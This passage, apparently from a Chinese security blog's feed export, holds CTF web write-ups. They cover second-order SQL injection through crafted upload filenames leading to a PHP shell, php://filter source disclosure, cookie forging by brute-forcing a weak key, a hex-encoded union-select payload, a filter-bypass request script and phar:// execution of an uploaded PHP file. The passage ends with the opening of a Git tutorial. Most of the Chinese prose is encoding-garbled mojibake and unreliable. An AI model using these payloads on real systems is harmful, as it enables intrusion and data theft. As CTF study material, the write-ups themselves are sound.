alt="kGYbgs.png"></p><p>æ‰€ä»¥è¿˜æ˜¯æ²¡æ‰¾åˆ°å¯åˆ©ç”¨çš„ç‚¹ï¼Œåœ¨æŸ¥çœ‹rename.phpï¼Œå‘ç°</p><p><img src="https://s2.ax1x.com/2019/02/03/kGYqvn.png" alt="kGYqvn.png"></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªç‚¹å°±æ˜¯oldname æ–‡ä»¶åæ¥è‡ªæ•°æ®åº“ï¼Œè€Œnewname çš„æ–‡ä»¶åæ¥è‡ªç”¨æˆ·è¾“å…¥ï¼Œè€Œæ¥è‡ªæ•°æ®åº“é‡Œé¢çš„æ•°æ®æ˜¯ä¸å¸¦è½¬ä¹‰ç¬¦å·çš„ï¼Œè¿™å°±å­˜åœ¨ä¸€ä¸ªäºŒæ¬¡æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨oldnameå»é—­åˆæ„é€ è¯­å¥ï¼Œä½¿åç¼€åä¸ºç©ºï¼Œæ„é€ ä¸€ä¸ªè¿™æ ·çš„è¯­å¥<code>update `file` set filename=34.jpg,oldname=â€™â€™,extension=â€™â€™,filename=â€™34.jpgâ€™ where `fid`=fid;</code></p><p><img src="https://s2.ax1x.com/2019/02/03/kGYOuq.png" alt="kGYOuq.png"></p><p>æˆ‘ä»¬å°±å¯ä»¥å…ˆä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åä¸ºâ€™,extension=â€™â€™,filename=â€™34.jpg.jpgçš„æ–‡ä»¶ï¼Œä¸ºä»€ä¹ˆè¦ä¸¤æ¬¡.jpg?</p><p>å› ä¸ºåœ¨ä¸‹é¢è¿™æ®µä»£ç ä¸­ä»–ä¼šè‡ªåŠ¨ç»™æ–‡ä»¶ååŠ ä¸Šåç¼€ï¼Œè¿™ä¸ªåç¼€ä¸åŠ çš„è¯ï¼Œæˆ‘ä»¬åœ¨åé¢çš„äºŒæ¬¡å‘½åä¼šä¸ç»Ÿä¸€ï¼Œä¾‹å¦‚æˆ‘ä»¬è‹¥ä¸Šä¼ äº†æ–‡ä»¶åä¸ºâ€™,extension=â€™â€™,filename=â€™34.jpgçš„æ–‡ä»¶çš„è¯è¾“å…¥çš„oldnameè·Ÿnewnameåˆ†åˆ«ä¸ºâ€™,extension=â€™â€™,filename=â€™34å’Œ34.phpä½†æ˜¯æ”¹ååæ–‡ä»¶ç³»ç»Ÿä¸‹ä¸º34.php.jpgè¿˜æ˜¯ä¸å¯æ‰§è¡Œçš„ã€‚å°±æ˜¯è¯´ç°åœ¨æ”¹åååœ¨æ–‡ä»¶ç›®å½•ä¸‹çš„æ–‡ä»¶æ˜¯34.jpg.jpg</p><p><img src="https://s2.ax1x.com/2019/02/03/kGYjbV.png" alt="kGYjbV.png"></p><p><img src="https://s2.ax1x.com/2019/02/03/kGYxET.png" alt="kGYxET.png"></p><p>ä¸Šé¢çš„é—®é¢˜æˆ‘ä»¬å¯ä»¥å†æ¬¡ä¸Šä¼ ä¸€ä¸ª34.jpgæ–‡ä»¶ä½¿å¾—æ–‡ä»¶ç›®ä¸‹å­˜åœ¨34.jpgï¼Œåé¢å°±å¯ä»¥åˆ©ç”¨extensionä¸ºç©ºï¼Œæ–‡ä»¶åä¸º34.jpgçš„æ–‡ä»¶å˜æˆ34.php </p><p><img src="C:\Users\Vinson Chan\AppData\Roaming\Typora\typora-user-images\1549181047549.png" alt="1549181047549"></p><p>å…¶å®æˆ‘ä»¬å°±æ˜¯åˆ©ç”¨è¿™ä¸¤è¡Œæ•°æ®ï¼Œç‰¹åˆ«æ³¨æ„çš„æ˜¯æˆ‘ä»¬æ”¹åçš„æ—¶å€™å¡«çš„æ˜¯æ–‡ä»¶åè€Œä¸åŒ…æ‹¬åç¼€åçš„ã€‚å†ä¸€æ¬¡æ”¹åï¼Œæ‰¾åˆ°çš„æ˜¯fidä¸º3çš„è¿™æ¡æ•°æ®,ç„¶åæ‹¼æ¥ä¸Šç©ºåç¼€åï¼Œåˆšå¥½æ˜¯æ–‡ä»¶ç³»ç»Ÿé‡Œé¢çš„34.jpgï¼Œè€Œè¿™ä¸ª34.jpgå°±æ˜¯æˆ‘ä»¬åˆšæ‰ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶é‡Œé¢çš„å†…å®¹æ˜¯<code>&lt;? phpinfo(); ?&gt;</code>ï¼Œæ‰“å¼€34.php,ç›´æ¥getshell</p><p><img src="https://s2.ax1x.com/2019/02/03/kGtS5F.png" alt="kGtS5F.png"></p><p>å…¶å®æ–‡ä»¶ç›®å½•ä¸‹34.jpg.jpgè¿˜åœ¨ï¼ŒçœŸæ­£æœ‰ä»·å€¼çš„æ˜¯ç¬¬äºŒæ¬¡ä¸Šä¼ çš„æ–‡ä»¶ï¼Œç¬¬ä¸€æ¬¡ä¸Šä¼ çš„æ–‡ä»¶åªä¸ºäº†æ„é€ ç©ºåç¼€åã€‚</p><p>è¿™ä¸ªé¢˜ç›®è¿˜æ˜¯å¾ˆå¥½çš„ï¼Œåœ¨è¿‡æ»¤æ¯”è¾ƒå®Œå–„çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸€ç§bypassæ€è·¯å€¼å¾—å­¦ä¹ ï¼Œä»æºç å®¡è®¡-&gt;æ–‡ä»¶ä¸Šä¼ -&gt;äºŒæ¬¡æ³¨å…¥-&gt;æ–‡ä»¶åä¿®æ”¹æ¼æ´åˆ©ç”¨ï¼Œè¿™ä¸€å¥—ä¸‹æ¥å¯¹æˆ‘è¿™ç§å°ç™½æ¥è®²å­¦åˆ°çš„å¤ªå¤šäº†ã€‚</p><h3 id="è“é²¸ç¬”è®°ç³»ç»Ÿ"><a href="#è“é²¸ç¬”è®°ç³»ç»Ÿ" class="headerlink" title="è“é²¸ç¬”è®°ç³»ç»Ÿ"></a>è“é²¸ç¬”è®°ç³»ç»Ÿ</h3><p>åˆšå¼€å§‹æ‹¿åˆ°è¿™ä¸ªé¢˜ç›®çš„æ—¶å€™ï¼Œä¸€çœ‹åˆ°æ—¶ç™»å½•æ¡†ï¼Œå°±ä»¥ä¸ºæ˜¯SQLçº¦æŸæ”»å‡»æˆ–è€…æ˜¯SQLæ³¨å…¥ï¼Œä½†æ˜¯SQLæ³¨å…¥æ²¡æœ‰ä»»ä½•å›æ˜¾ï¼Œåªèƒ½å°è¯•SQLçº¦æŸï¼Œå‘ç°ç¡®å®æœ‰è¿™ä¸ªæ¼æ´ï¼Œä½†ç™»é™†è¿›å»ä¹‹åï¼Œå‘ç°æœ‰æç¤º/dbinit.sqlï¼Œæ‰“å¼€å‘ç°æ˜¯æ•°æ®åº“åˆ›å»ºçš„ä»£ç ï¼Œå‘ç°æœ‰flagå­—æ®µ</p><p><img src="https://s2.ax1x.com/2019/02/03/kGsYXF.png" alt="kGsYXF.png"></p><p>ä½†æ˜¯æ²¡æœ‰ä»»ä½•åˆ©ç”¨ä»·å€¼ï¼Œçœ‹äº†å¡”ä¸»çš„è§£æåï¼Œæ‰å‘ç°åŸæ¥urlæœ‰é—®é¢˜ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ä¸€ç›´ç›¯ç€ä¸€å¤„æ¼æ´ä¸€ç›´ä¸æ”¾æ‰‹ï¼Œæœ‰æ—¶å€™æ¢ä¸ªè§’åº¦æˆ–è®¸å°±æœ‰ç»“æœäº†ã€‚æˆ‘ä»¬å‘ç°urlæ˜¯åŠ¨æ€çš„ï¼Œé¦–é¡µæ˜¯è¿™æ ·çš„ : <code>index.php?action=front&amp;mode=index</code>ï¼Œæ–°å»ºç¬”è®°é¡µé¢æ˜¯è¿™æ ·çš„:<code>index.php?action=front&amp;mode=newnote</code>ï¼Œåˆ é™¤ç¬”è®°é¡µé¢æ˜¯è¿™æ ·çš„: <code>index.php?action=front&amp;mode=delete&amp;id=4&amp;TOKEN=hhhhhhwhhhhhhwhw</code></p><p> äºæ˜¯çŒœæµ‹æœ‰æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„LFIæ¼æ´</p><p>ç›´æ¥è®¿é—®front/index.phpå¾—åˆ°</p><p><img src="https://s2.ax1x.com/2019/02/03/kGsU0J.png" alt="kGsU0J.png"></p><p>ä¸å…è®¸è®¿é—®è¯´æ˜è¿™ä¸ªé¡µé¢æ˜¯å­˜åœ¨çš„ï¼ŒçŒœæµ‹åå°ä¸ºinclude($action.â€™/â€™.$mode.â€™.phpâ€™)</p><p>å› ä¸ºè¿™é‡Œphpç‰ˆæœ¬å¤§äº5.3ï¼Œä¸èƒ½ç”¨00æˆªæ–­äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨phpä¼ªåè®®æŠŠä»–ä»¬è¯»å‡ºæ¥æ„é€ 202.98.28.108:10013/7sghfe673jd3/index.php?action=php://filter/read=convert.base64-encode/resource=.&amp;mode=index</p><p>å¾—åˆ°base64ç¼–ç åçš„æºç ï¼Œè§æºä»£ç ä¸€å¼€å§‹å­˜åœ¨addslashesè¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çŸ¥é“æˆ‘ä»¬åˆ©ç”¨æ³¨å…¥çš„æ¼æ´å»è§£å†³è¿™ä¸€é“é¢˜çš„æ–¹æ³•ä¸å¤ªå¯è¡Œ<br>è§£ç åå‘ç°æ–‡ä»¶ä¸­è¿˜åŒ…å«äº†common.phpåŒæ ·çš„åŠæ³•å¾—åˆ°common.phpçš„æºä»£ç ï¼Œcommon.phpçš„æºä»£ç é‡Œé¢è¿˜åŒ…å«äº†ä¸€ä¸ªconfig.inc.phpï¼Œä½†æ˜¯æ‹–ä¸å‡ºæ¥<br>åˆ°è¿™é‡Œå°±æ²¡æœ‰å•¥å¤´ç»ªäº†ï¼Œåªèƒ½å›å»çœ‹ä¸€ä¸‹æœ‰ä»€ä¹ˆå¯ä»¥äº†åˆ©ç”¨çš„ï¼Œçªç„¶å‘ç°é‚£ä¸ªåˆ ä¸æ‰çš„è®°å½•æåˆ°administratorçŒœæµ‹å¯èƒ½å­˜åœ¨åå°äºæ˜¯æ‹¿å‡ºå¾¡å‰‘æ‰«æä¸€æ³¢åå°<br>å‘ç°adminç›®å½•ä¸‹é¢çš„å‡ ä¸ªæ–‡ä»¶</p><p><img src="https://s2.ax1x.com/2019/02/03/kGIs3Q.png" alt="kGIs3Q.png"></p><p>äºæ˜¯åŒæ ·çš„æ–¹æ³•æŠŠè¿™å‡ ä¸ªæ–‡ä»¶çš„æºç ç»™å¼„å‡ºæ¥<br>è¿›å…¥åå°adminç™»å½•é¡µé¢ï¼Œç”¨æˆ·åè¢«é”å®šï¼Œåº”è¯¥è¿™å°±æ˜¯é‚£ä¸€ä¸ªadminçš„ç™»å½•é¡µé¢äº†<br>å®¡è®¡ä¸€ä¸‹è¿™ä¸ªé¡µé¢çš„æºç <br>æˆ‘ä»¬çœ‹åˆ°admin/login.phpå‰é¢æœ‰unameè¿˜æœ‰passwordä½†æ˜¯è¿™ä¸ªpasswordä¸çŸ¥é“ï¼Œæˆ‘ä»¬åªèƒ½çœ‹åˆ°ä¸‹é¢ç™»å½•ä»¥åçš„set_loginå‡½æ•°ï¼Œè¿›å»å‡½æ•°çš„å®šä¹‰é‡Œé¢çœ‹ä¸€ä¸‹</p><p><img src="https://s2.ax1x.com/2019/02/03/kGIRH0.png" alt="kGIRH0.png"></p><p>å‘ç°å¦‚æœä¸å­˜åœ¨ç™»å½•ä¿¡æ¯çš„è¯ï¼Œuseridå’Œleveléƒ½ä¼šç½®ç©ºï¼Œè¿™å°±å¯ä»¥ç»•è¿‡admin/index.phpé‡Œé¢çš„è¿™ä¸ªåˆ¤æ–­ï¼Œå› ä¸ºnullï¼=false=&gt;true </p><p><img src="https://s2.ax1x.com/2019/02/03/kGIfEV.png" alt="kGIfEV.png"></p><p>è€Œä¸”set_loginè¿˜ä¼šå‘é€cookieï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜è¦æ„é€ cookieï¼Œè€Œä¸”cookieçš„çš„æ ¼å¼æ˜¯admin|md5(SECURITY_KEY+â€™adminâ€™)</p><p><img src="https://s2.ax1x.com/2019/02/03/kGIhNT.png" alt="kGIhNT.png"></p><p>è€Œä¸”security_keyè¿˜æœ‰tokenæ²¡æœ‰è®¾ç½®ï¼Œå°±ä¼šç”¨randå‡½æ•°ç”Ÿæˆéšæœºæ•°ï¼Œè¿™é‡Œçš„æºä»£ç ä½¿ç”¨whä¸­çš„6ä½éšæœºæ’åˆ—ï¼Œæˆ‘ä»¬é€‰æ‹©çˆ†ç ´(è¿™é‡Œæœ¬æ¥æ˜¯æ¨ç®—éšæœºæ•°ï¼Œä¸è¿‡è¿™ä¸ªbugå¥½åƒåœ¨phpä¸­è¢«ä¿®å¤äº†ï¼Œå‡ºé¢˜äººä¹Ÿå¾ˆä»æ…ˆå¾—æŠŠåˆå§‹çš„éšæœºæ•°è¡¨å˜æˆäº†â€œwhâ€å‡å°‘äº†éš¾åº¦ã€‚ç›´æ¥çˆ†ç ´å°±å¯ä»¥äº†)</p><p>ç„¶åæˆ‘ä»¬åˆ†åˆ«æ”¹å˜cookieçš„UIDå’ŒPHPSESSIDï¼Œè¿›å…¥indexé¡µé¢å°±è¿›å…¥äº†adminç®¡ç†é¡µé¢ï¼Œç‚¹å‡»é‚£ä¸€ä¸ª20æ¡ç¬”è®°å‘ç°å­˜åœ¨ä¸€ä¸ªåå­—å«setpagenumçš„é¡µé¢ï¼Œäºæ˜¯æˆ‘ä»¬ç”¨åŒæ ·çš„åŠæ³•æŠŠä»–çš„æºç ç»™æå–å‡ºæ¥</p><p>å‘ç°é‡Œé¢çš„pageå‚æ•°ç»è¿‡is_numericçš„å‡½æ•°çš„æ£€æµ‹ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“è¿™ä¸ªå‡½æ•°å¯ä»¥ç”¨åå…­è¿›åˆ¶ç»•è¿‡ï¼Œè¿™é‡Œåº”è¯¥æ˜¯ä¸ºäº†è¿‡æ»¤è¿›å…¥åˆ°æ•°æ®åº“pageè¡¨é‡Œé¢çš„æ•°æ®ä¸ºæ•°å­—</p><p><img src="https://s2.ax1x.com/2019/02/03/kGIXE6.png" alt="kGIXE6.png"></p><p>çœ‹ä¸€ä¸‹indexé¡µé¢çš„å±•ç¤ºæ•°æ®åº“å†…å®¹çš„è¯­å¥ï¼Œè¿½è¸ªget_page_size()å‡½æ•°</p><p><img src="https://s2.ax1x.com/2019/02/03/kGIzCD.png" alt="kGIzCD.png"></p><p>å‘ç°é‡Œé¢çš„numå‚æ•°æœ¬åº”è¯¥æ˜¯æ•°å­—ï¼Œç›¸å½“äºsetpagenumé¡µé¢çš„pageå‚æ•°ï¼Œå› ä¸ºmysql_fetch_assoc() å‡½æ•°ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„ï¼Œè¿”å›äº†setpagenumé¡µé¢åœ¨æ•°æ®åº“æ›´æ–°çš„numå‚æ•°ï¼Œä½†å‘ç°æ•°æ®åº“é‡Œé¢çš„ç±»å‹è·Ÿä»–ä¸ä¸€è‡´å•Šï¼Œæ•°æ®åº“é‡Œé¢æ˜¯å­—ç¬¦ä¸²ç±»å‹çš„ï¼Œè¿™å°±æœ‰ä¸€ä¸ªæ¼æ´çš„åˆ©ç”¨æ–¹å‘äº†ã€‚</p><p><img src="https://s2.ax1x.com/2019/02/03/kGo9vd.png" alt="kGo9vd.png"></p><p>äºæ˜¯æˆ‘ä»¬æ„é€ è¯­å¥</p><p>è¿™é‡Œæ„é€ å››åˆ—æ˜¯å› ä¸ºåœ¨hinté‡Œé¢å‘ç°çš„SQLè¯­å¥noteæœ‰å››åˆ—ï¼Œå›æ˜¾çš„æ˜¯ç¬¬äºŒåˆ—ï¼ŒæŠŠä»–ç¼–è¾‘æˆ16è¿›åˆ¶å¾—åˆ°0x3120756e696f6e2073656c65637420312c666c61672c332c342066726f6d20666c616773ï¼Œè¾“å…¥åˆ°è®¾ç½®æ¡æ•°é‡Œé¢ï¼Œå¾—åˆ°flag</p><p><img src="https://s2.ax1x.com/2019/02/03/kGoiDI.png" alt="kGoiDI.png"></p><p>è¿™ä¸€ä¸ªé¢˜ç›®ç”¨åˆ°äº†æºç å®¡è®¡ï¼ŒPHPä¼ªåè®®ï¼ŒäºŒæ¬¡æ³¨å…¥è¿˜æœ‰ä¼ªéšæœºæ•°ï¼Œå­¦åˆ°äº†å¾ˆå¤š</p><h3 id="è“é²¸ç›¸å†Œå±•è§ˆ"><a href="#è“é²¸ç›¸å†Œå±•è§ˆ" class="headerlink" title="è“é²¸ç›¸å†Œå±•è§ˆ"></a>è“é²¸ç›¸å†Œå±•è§ˆ</h3><p>çŸ¥è¯†ç‚¹ æ³¨å…¥ç»•è¿‡str_replace æ³¨å…¥ä¸‹è½½æ–‡ä»¶ unionç›²æ³¨ pharç»•è¿‡åç¼€åè§£æ</p><p>æ‰“å¼€ç½‘ç«™åå‘ç°æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œå¸æ”¶äº†å‰å‡ æ¬¡çš„ç»éªŒï¼Œè¿›æ¥å…ˆä¸è¦çœ‹åˆ°æœ‰ç™»å½•ç•Œé¢å°±ä¸€ç›´å¾€æ³¨å…¥æ–¹å‘å»æƒ³ï¼Œæ‰“å¼€æºä»£ç åå‘ç°å­˜åœ¨æ³¨å†Œé¡µé¢çš„æç¤ºï¼Œäºæ˜¯æˆ‘ä»¬å°±å…ˆå»æ³¨å†Œé¡µé¢æ³¨å†Œä¸ªè´¦å·è¿›å»çœ‹ä¸€ä¸‹è¿™ä¸ªç½‘ç«™æœ‰ä»€ä¹ˆåŠŸèƒ½ã€‚</p><p><img src="https://s2.ax1x.com/2019/02/03/kGowrR.png" alt="kGowrR.png"></p><p>å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç™»é™†è¿›å»ä¹‹åå‘ç°æœ‰ä¸‰ä¸ªåŠŸèƒ½</p><p>ä¸»é¡µï¼Œä¸‹è½½ï¼Œä¸Šä¼ ï¼Œæˆ‘ä»¬é‡ç‚¹çœ‹ä¸‹è½½è·Ÿä¸Šä¼ åŠŸèƒ½ï¼Œçœ‹è¿™ä¸ªurlï¼Œfile=xxx,æ„Ÿè§‰å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå°è¯•ç”¨phpä¼ªåè®®æŠŠæºç ç»™æ‹–å‡ºæ¥ã€‚å‘ç°è¢«æ‹’ç»äº†ï¼Œäºæ˜¯æˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹ä¸Šä¼ åŠŸèƒ½ï¼Œå‘ç°åªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œä¸Šä¼ åå®ƒä¼šåœ¨downloadå¤„å›æ˜¾ï¼Œåœ¨downloadå¤„ç‚¹å‡»æ”¶è—ä¼šæŠŠæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ã€‚å…ˆå°è¯•ä¸€æ³¢æ–‡ä»¶æˆªæ–­çš„å¤„ç†æ“ä½œï¼ŒæŠ“åŒ…æ”¹æ–‡ä»¶åï¼Œä¸Šä¼ è¿˜æ˜¯ä¸è¡Œï¼Œå› ä¸ºå…³é”®çš„æ–‡ä»¶è·¯å¾„ä¸çŸ¥é“</p><p>åªèƒ½å¦å¯»åˆ«è·¯äº†ï¼Œä¸‹è½½ä¸€å¼ å›¾ç‰‡ï¼ŒæŠ“åŒ…ï¼Œå‘ç°ä¸‹é¢çš„ä¿¡æ¯</p><p><img src="https://s2.ax1x.com/2019/02/03/kGofsA.png" alt="kGofsA.png"></p><p>è¿™ä¸ªä¸‹è½½ä¼¼ä¹æ˜¯åˆ©ç”¨imageè¿™ä¸ªæ ‡ç­¾åœ¨æ•°æ®åº“å¯»æ‰¾ä¸‹è½½ç„¶åä¸‹è½½çš„ï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹èƒ½å¦æ³¨å…¥ï¼Œè¾“å…¥å•å¼•å·ä¼šå‡ºç°è­¦å‘Šï¼Œç›´è§‰æ„Ÿè§‰è¿‡æ»¤åšå¾—å¾ˆä¸¥ï¼Œäºæ˜¯å°è¯•åŒå†™ç»•è¿‡åˆ©ç”¨å†åŠ ä¸Šunion select hex(æ–‡ä»¶åå»ä¸‹è½½æºç )ï¼Œä¸è¿‡å¾—å…ˆè®©å‰é¢çš„æœç´¢idä¸èƒ½æ˜¯ä¸ªå¯ä»¥æ‰¾å¾—åˆ°çš„idå·ï¼Œä¸ç„¶ä¼šä¸€ç›´ä¸‹è½½è‡ªå·±ä¸Šä¼ çš„é‚£ä¸€ä¸ªæ–‡ä»¶</p><p><img src="https://s2.ax1x.com/2019/02/03/kGohqI.png" alt="kGohqI.png"></p><p>å¾—åˆ°index.phpçš„æºç ï¼Œå‘ç°é‡Œé¢è¿˜æœ‰config.phpï¼ŒåŒæ ·çš„æ–¹æ³•æŠŠä»–ç»™ä¸‹è½½ä¸‹æ¥ï¼ŒåŒç†æˆ‘ä»¬æŠŠå„ä¸ªæ¨¡å—çš„æºä»£ç ç»™ä¸‹è½½ä¸‹æ¥</p><p>é¦–å…ˆæŸ¥çœ‹å…¨å±€é…ç½®æ–‡ä»¶config.phpï¼Œæˆ‘ä»¬å‘ç°é‡Œé¢ç¡®å®ç”¨äº†addslasheså‡½æ•°å»è¿‡æ»¤ï¼Œæ‰€ä»¥è¯´è¿™å°±å‡å°‘äº†æ³¨å…¥çš„å¯èƒ½æ€§äº†ï¼Œå†æ¥çœ‹çœ‹ä¸‹é¢è¿˜æœ‰ä¸ªfilterå‡½æ•°è¿™ä¸ªå‡½æ•°å°±æ˜¯ä¸ºä»€ä¹ˆåˆšæ‰å¯ä»¥ç”¨åŒå†™ç»•è¿‡çš„åŸå› ï¼Œå› ä¸ºä»–æ²¡æœ‰è®¾ç½®ç¬¬å››ä¸ªå‚æ•°ï¼Œé»˜è®¤å°±ä¼šæ›¿æ¢ä¸€æ¬¡ï¼Œä»è€ŒåŒå†™ç»•è¿‡ï¼Œè€Œæˆ‘ä»¬åœ¨PHPé‡Œé¢è¿˜æœ‰ä¸€ä¸ªstr_ireplaceçš„å‡½æ•°å¯¹å¤§å°å†™æä¸æ•æ„Ÿï¼Œå¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡ã€‚</p><p>æˆ‘ä»¬åœ¨upload.phpé‡Œé¢çš„å‘ç°æ–‡ä»¶ä¸Šä¼ è§„åˆ™ï¼Œåªå…è®¸ä¸Šä¼ å›¾ç‰‡</p><p><img src="https://s2.ax1x.com/2019/02/03/kGo5Zt.png" alt="kGo5Zt.png"></p><p>ä¸‹é¢å°±æ˜¯æ–‡ä»¶å‘½åè§„åˆ™</p><p><img src="https://s2.ax1x.com/2019/02/03/kGoIdP.png" alt="kGoIdP.png"></p><p>å‘ç°é‡Œé¢æœ‰ä¸€ä¸ªéšæœºæ•°å‘½åï¼ŒæŸ¥çœ‹æ­¤å‡½æ•°ä½äºconfig.phpé‡Œé¢</p><p><img src="C:\Users\Vinson Chan\AppData\Roaming\Typora\typora-user-images\1549204940505.png" alt="1549204940505"></p><p><img src="file:///C:/Users/VINSON~1/AppData/Local/Temp/msohtmlclip1/01/clip_image001.png" alt="img"></p><p>ç”Ÿæˆçš„æ˜¯32ä½çš„éšæœºæ•°ï¼Œå¯èƒ½å°±å­˜åœ¨éšæœºæ•°çš„æ¼æ´ï¼Œæˆ‘ä»¬ä½¿ç”¨unionç›²æ³¨çš„æ–¹æ³•æŠŠæ–‡ä»¶è·¯å¾„ç»™è·‘å‡ºæ¥å¾—åˆ°æ–‡ä»¶è·¯å¾„å</p><p>ç”¨è„šæœ¬å»åˆ©ç”¨unionç›²æ³¨è·‘æ–‡ä»¶åï¼Œé‡è¦çš„æ˜¯å¦‚ä½•åŒå†™ç»•è¿‡ï¼Œå› ä¸ºè¿™é‡Œé¢download.phpçš„åŠŸèƒ½åªæœ‰åœ¨ç™»é™†ä»¥åæ‰å¯ä»¥å®ç°ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å¿…é¡»çš„å¸¦cookieè·‘ï¼Œæˆ‘ä¸‹é¢å°±æ˜¯æˆ‘çš„requestè¯·æ±‚è¦å‘é€çš„å†…å®¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data=<span class="string">"image=212 ununionion diisstinct selselectect 0x&#123;filename&#125; oisrorder by 1 desc&amp;image_download=%E6%94%B6%E8%97%8F"</span></span><br><span class="line">    url = <span class="string">"http://ctf.whaledu.com:10012/52gw5g4hvs59/downfile.php"</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">        <span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=a2ds5od7uidniglahrdt7u53v3"</span>,</span><br><span class="line">        <span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æœ€åè·‘å‡ºæ–‡ä»¶åå•¦23333</p><p><img src="https://s2.ax1x.com/2019/02/03/kG54ld.png" alt="kG54ld.png"></p><p>å¤ä¹ ä¸€ä¸‹phpä¸ºåè®®é‡Œé¢çš„çŸ¥è¯†ç‚¹ï¼Œä¸€ä¸ªæ˜¯pharä¸€ä¸ªæ˜¯zipä¼ªåè®®ï¼Œè¿™ä¸¤ä¸ªåè®®å¯ä»¥è¯†åˆ«å‹ç¼©åŒ…ï¼Œå¹¶å°†å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶è¯»å–å‡ºæ¥æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æŠŠä¸€å¥è¯çš„phpæ–‡ä»¶æ‰“åŒ…æˆå‹ç¼©åŒ…ï¼Œåˆ©ç”¨ä¸‹é¢çš„åè®®å»æ‰§è¡Œ</p><p>Zipåè®®ï¼š<code>file=zip://1.jpg%231.php</code>   æ³¨æ„è¿™é‡Œzipä½¿ç”¨<code>#</code>ä¹Ÿå°±æ˜¯<code>%23</code>åˆ†å‰²ï¼Œè€Œpharä½¿ç”¨çš„æ˜¯<code>/</code>åˆ†å‰²å¹¶ä¸”æ‰§è¡Œæ–‡ä»¶ä¸åŠ åç¼€åï¼Œå› ä¸ºæºç é‡Œé¢å·²ç»åŒ…å«äº†åç¼€åPharåè®®ä¸º:<code>file=phar://1.jpg/1</code></p><p>æ¥ä¸‹æ¥å°±æ˜¯ç”¨pharåè®®äº†,è·å¾—flagæ‰€åœ¨é¡µé¢ä¸º<code>F1AgIsH3r3G00d.php</code>ï¼Œfile=phar://./Up10aDs/fvgdvan23vtfezk89ngad52bkhzvaio4.jpg/1</p><p><img src="https://s2.ax1x.com/2019/02/03/kG5jpQ.png" alt="kG5jpQ.png"></p><p> æ‰“å¼€å‘ç°ä»€ä¹ˆéƒ½çœ‹ä¸è§ï¼Œåˆæƒ³åˆ°ä¸€å¼€å§‹è¯»æ–‡ä»¶çš„æ“ä½œï¼Œäºæ˜¯å†å°è¯•å‘ç°ï¼ŒæˆåŠŸè¯»å–flag</p><p><img src="https://s2.ax1x.com/2019/02/03/kGIEp4.png" alt="kGIEp4.png"></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Gitå­¦ä¹ ç¬”è®°</title>
      <link href="/git-learning.html"/>
      <url>/git-learning.html</url>
      <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>   ä¸ºäº†åšé¡¹ç›®ï¼Œæ²¡åŠæ³•å¾—å­¦ä¸€ä¸‹Git</p><a id="more"></a><h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1><h2 id="å®‰è£…Git"><a href="#å®‰è£…Git" class="headerlink" title="å®‰è£…Git"></a>å®‰è£…Git</h2><p>å› ä¸ºä¸ºæˆ‘æ˜¯åœ¨Windowsä¸‹è¿è¡Œçš„æ‰€ä»¥ç›´æ¥ä¸‹è½½å®‰è£…åŒ…å®‰è£…ï¼Œå®‰è£…åå³é”®æ‰“å¼€Git-&gt;bash</p><p>åœ¨å‘½ä»¤è¡Œé‡Œé¢è¾“å…¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">"Your Name"</span></span><br><span class="line">$ git config --global user.email <span class="string">"email@example.com"</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿä¸‹æ¯ä¸ªæœºå™¨éƒ½å¿…é¡»è‡ªæŠ¥å®¶é—¨</p><p><code>æ³¨æ„</code>git configå‘½ä»¤çš„â€“globalå‚æ•°ï¼Œç”¨äº†è¿™ä¸ªå‚æ•°ï¼Œè¡¨ç¤ºä½ 